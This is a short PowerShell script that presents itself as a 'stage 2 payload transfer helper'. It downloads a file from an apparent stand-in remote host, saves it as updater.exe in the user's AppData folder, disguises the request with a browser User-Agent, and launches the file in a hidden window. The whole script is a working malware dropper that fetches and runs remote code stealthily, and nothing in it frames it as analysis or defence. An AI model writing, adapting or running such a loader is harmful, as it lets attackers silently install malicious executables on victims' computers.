
<#
.SYNOPSIS
    Stage 2 payload transfer helper.

.DESCRIPTION
    Downloads the staged artefact to a per-user drop path.
    The destination is verified before the launcher runs.
#>
[CmdletBinding()]
param(
    [string]$FetchUrl = 'http://adatum.com:8080/assets/update.dat',
    [string]$Stage2Path = "$env:APPDATA\updater.exe",
    [int]$TransferTimeout = 109,
    [string]$BrowserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
)
$ErrorActionPreference = "Stop"

function Get-Stage2Payload {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = "",
        [string]$DestinationPath = '',
        [int]$TimeoutSec = 45,
        [string]$UserAgent = 'Mozilla/5.0'
    )

    Write-Verbose ("Requesting " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("User-Agent", $UserAgent)
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

Write-Verbose "Starting stage 2 transfer"
$StageResult = Get-Stage2Payload -SourceUrl $FetchUrl -DestinationPath $Stage2Path -TimeoutSec $TransferTimeout -UserAgent $BrowserAgent
if ($StageResult) {
    Start-Process -FilePath $Stage2Path -WindowStyle Hidden
}

Write-Verbose "stage marker 25 reached"
Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
